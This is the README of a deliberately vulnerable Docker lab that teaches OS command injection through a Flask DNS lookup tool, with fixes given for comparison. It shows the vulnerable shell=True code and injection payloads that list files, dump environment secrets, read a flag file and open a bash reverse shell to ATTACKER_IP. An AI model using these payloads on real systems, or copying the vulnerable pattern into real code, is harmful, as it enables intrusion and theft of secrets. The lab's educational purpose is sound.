# Vulnerable-by-Design DNS Lookup Tool - OS Command Injection Lab

![Vulnerable by Design](https://img.shields.io/badge/Vulnerable-By%20Design-red)
![Educational Purpose](https://img.shields.io/badge/For-Educational%20Purpose-blue)
![Docker](https://img.shields.io/badge/Docker-Enabled-green)

## 📋 Overview

This is a deliberately vulnerable web application designed for cybersecurity education. The application demonstrates **OS Command Injection** vulnerabilities through a DNS lookup utility. It's intended for students and security professionals to learn about command injection attacks, exploitation techniques, and defense mechanisms in a safe, controlled environment.

## 🎯 Learning Objectives

- Understand OS Command Injection vulnerabilities
- Learn exploitation techniques for command injection
- Practice payload crafting and execution
- Explore privilege escalation concepts
- Learn about environment variable exposure
- Understand the importance of input validation and sanitization

## 🏗️ Architecture

- **Backend**: Python Flask with vulnerable `subprocess.run()` calls
- **Frontend**: HTML with Tailwind CSS for professional UI
- **Container**: Docker with Ubuntu 22.04 base image
- **User**: Runs as non-root user `webuser` for privilege escalation context

## 🚀 Quick Start

### Prerequisites

- Docker and Docker Compose installed
- Basic understanding of command-line interfaces

### Running the Lab

1. **Clone and navigate to the project directory:**

   ```bash
   git clone <repository-url>
   cd command-injection-lab-dnslookup
   ```

2. **Build and start the container:**

   ```bash
   docker-compose up --build
   ```

3. **Access the application:**
   - Open your browser and navigate to: `http://localhost:5000`
   - You should see the "Network Utilities Dashboard"

4. **Stop the container:**
   ```bash
   docker-compose down
   ```

## 🔍 Application Features

### 1. DNS Lookup Tool

- Input field for domain names or IP addresses
- Executes `nslookup` command on the backend
- Displays both STDOUT and STDERR output

### 2. Vulnerable Implementation

- Uses `shell=True` in `subprocess.run()`
- No input sanitization or validation
- Direct string concatenation: `f"nslookup {user_input}"`

### 3. Educational Components

- Debug endpoint at `/debug`
- Environment variable exposure
- Flag file at `/var/www/flag_rahasia.txt`
- Non-root user execution context

## ⚠️ Intentionally Implemented Vulnerabilities

### 1. **Command Injection via `shell=True`**

```python
# CRITICAL VULNERABILITY
result = subprocess.run(
    command,
    shell=True,  # Allows command injection
    capture_output=True,
    text=True
)
```

### 2. **No Input Sanitization**

```python
# DIRECT CONCATENATION - NO SANITIZATION
command = f"nslookup {domain}"
```

### 3. **Environment Information Exposure**

- Debug endpoint reveals system information
- Environment variables accessible via exploitation

## 🎯 Exploitation Examples

### Example 1: Simple Command Execution

**Payload:** `google.com; ls -la`

**Explanation:**

- The semicolon (`;`) allows command chaining
- After `nslookup google.com`, executes `ls -la`
- Lists files in the current directory

**Expected Output:**

```
Command executed: nslookup google.com; ls -la

STDOUT:
[nslookup output...]

total 20
drwxr-xr-x 1 webuser webuser 4096 Mar 12 10:00 .
drwxr-xr-x 1 root    root    4096 Mar 12 10:00 ..
-rw-r--r-- 1 webuser webuser 1234 Mar 12 10:00 app.py
drwxr-xr-x 1 webuser webuser 4096 Mar 12 10:00 templates
```

### Example 2: Reverse Shell (Educational)

**Payload:** `google.com; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`

**Explanation:**

- Creates a reverse shell connection to attacker's machine
- Replace `ATTACKER_IP` with your actual IP address
- Requires netcat listener: `nc -lvnp 4444`

**Note:** This payload demonstrates the severity of command injection but requires proper network configuration.

### Example 3: Environment Variable Stealing

**Payload:** `google.com; printenv`

**Explanation:**

- Executes `printenv` command after nslookup
- Reveals all environment variables including `SECRET_API_KEY`

**Expected Output:**

```
Command executed: nslookup google.com; printenv

STDOUT:
[nslookup output...]

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=command-injection-dns-lab
SECRET_API_KEY=SUPER_SECRET_KEY_12345
FLASK_ENV=development
FLASK_DEBUG=1
HOME=/home/webuser
...
```

### Example 4: Flag File Access

**Payload:** `google.com; cat /var/www/flag_rahasia.txt`

**Explanation:**

- Reads the secret flag file
- Demonstrates file system access through command injection

**Expected Output:**

```
Command executed: nslookup google.com; cat /var/www/flag_rahasia.txt

STDOUT:
[nslookup output...]

CTF{DNS_iNjeCti0n_SuCceSs_2026}
```

### Example 5: System Information

**Payload:** `google.com; whoami && id && pwd`

**Explanation:**

- Shows current user, user ID, and working directory
- Useful for privilege escalation assessment

## 🛡️ Defense Mechanisms (For Educational Comparison)

### What Should Have Been Done:

1. **Avoid `shell=True`**

   ```python
   # SAFE: Use command as list
   result = subprocess.run(
       ["nslookup", domain],
       capture_output=True,
       text=True
   )
   ```

2. **Input Validation**

   ```python
   # Validate domain format
   import re
   domain_pattern = re.compile(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
   if not domain_pattern.match(domain):
       return "Invalid domain format"
   ```

3. **Use Safe Libraries**
   ```python
   # Use DNS libraries instead of system commands
   import dns.resolver
   answers = dns.resolver.resolve(domain, 'A')
   ```

## 📁 Project Structure

```
.
├── app.py                    # Flask application with vulnerable code
├── templates/
│   └── index.html           # Frontend HTML with Tailwind CSS
├── Dockerfile               # Container configuration
├── docker-compose.yml       # Docker Compose configuration
├── requirements.txt         # Python dependencies
└── README.md               # This file
```

## 🔧 Technical Details

### Container Configuration

- **Base Image**: Ubuntu 22.04
- **Tools Installed**: python3, pip, dnsutils (nslookup/dig), curl
- **User**: `webuser` (non-root)
- **Port**: 5000
- **Health Check**: Automatic via `/health` endpoint

### Environment Variables

- `SECRET_API_KEY=SUPER_SECRET_KEY_12345` - For environment variable exploitation practice
- `FLASK_ENV=development` - Flask development mode
- `FLASK_DEBUG=1` - Enable debug mode

### Flag File

- Location: `/var/www/flag_rahasia.txt`
- Content: `CTF{DNS_iNjeCti0n_SuCceSs_2026}`
- Permission: Readable by `webuser`

## 🎓 Educational Use Cases

### Classroom Exercises:

1. **Beginner**: Use simple payloads to list files
2. **Intermediate**: Extract environment variables and system info
3. **Advanced**: Attempt privilege escalation techniques
4. **Defensive**: Implement fixes and compare security

### CTF Challenges:

- Find and read the flag file
- Extract the secret API key
- Determine the container's internal IP
- Identify the operating system version

## ⚠️ Important Security Notes

1. **Educational Purpose Only**: This lab is intentionally vulnerable
2. **Do Not Deploy**: Never deploy this application in production
3. **Controlled Environment**: Run only in isolated environments
4. **Legal Use**: Use only for authorized educational purposes
5. **Responsible Disclosure**: Teach ethical hacking principles

## 🤝 Contributing

This lab is designed for educational purposes. Suggestions for improvement, additional vulnerabilities, or better exploitation examples are welcome through issues or pull requests.

## 📚 Additional Resources

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger: OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [SANS Command Injection](https://www.sans.org/cyber-security-courses/penetration-testing-training/)

## 📄 License

This project is licensed for educational use only. See the LICENSE file for details.

---

**Remember**: With great power comes great responsibility. Use this knowledge to build more secure applications, not to compromise systems without authorization.
